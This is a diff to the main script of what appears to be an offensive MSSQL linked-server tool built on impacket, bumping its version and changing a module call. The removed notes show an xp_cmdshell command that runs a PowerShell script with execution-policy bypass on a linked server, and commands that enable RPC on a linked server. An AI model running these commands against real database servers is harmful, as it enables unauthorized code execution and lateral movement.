@@ -2,7 +2,7 @@
 ########################################################
 __author__ = ['Nimrod Levy']
 __license__ = 'GPL v3'
-__version__ = 'v1.1'
+__version__ = 'v1.2'
 __email__ = ['El3ct71k@gmail.com']
 
 ########################################################
@@ -13,18 +13,6 @@ from getpass import getpass
 from impacket.examples import logger
 from playbooks.playbooks import Playbooks
 from impacket.examples.utils import parse_target
-
-
-"""
-login-mapping
-SQL (WEB06\Administrator  dbo@master)> EXECUTE('xp_cmdshell "powershell -ep bypass -File C:\\Windows\\Temp\\p.ps1";') AT SQL03
-[-] ERROR(WEB06\SQLEXPRESS): Line 1: Access to the remote server is denied because no login-mapping exists.
-
-
-EXEC sp_serveroption 'SQLSRV01','rpc','true';
-EXEC sp_serveroption 'SQLSRV01','rpc out','true';
-
-"""
 
 
 def main():
@@ -64,7 +52,7 @@ def main():
     if not mssql_client.enumerate():
         return
 
-    mssql_client.execute_module(options)
+    mssql_client.execute_module(options.chain_id, options.link_name, options)
     mssql_client.disconnect()
 
 
